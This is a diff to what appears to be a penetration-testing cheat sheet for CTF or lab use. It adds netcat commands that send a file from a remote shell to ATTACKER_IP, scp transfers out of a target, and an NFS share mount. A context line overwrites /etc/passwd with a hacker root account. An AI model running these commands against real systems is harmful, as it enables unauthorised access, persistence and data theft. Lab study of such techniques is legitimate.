@@ -87,9 +87,35 @@ tree tmp
 echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
 ```
 
+#### File Transfer on `Netcat`
+
+1. To download a file on the remote shell:
+
+```nc
+nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
+```
+
+2. To receive the file on the attacker machine:
+
+```nc
+nc -l ATTACKER_PORT > [output_file_path]
+```
+
+#### Transfer files using `scp`:
+
+```
+scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
+scp -i id_rsa user@$IP:/home/willow/user.jpg . 
+```
 #### fix PATH in old ubuntu
 ```
 export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+```
+#### mount
+```sh
+sudo apt install nfs-common
+showmount -e $IP
+sudo mkdir /mnt/nfs                                                              sudo mount -t nfs $IP:/var/failsafe /mnt/nfs 
 ```
 
 #### grep
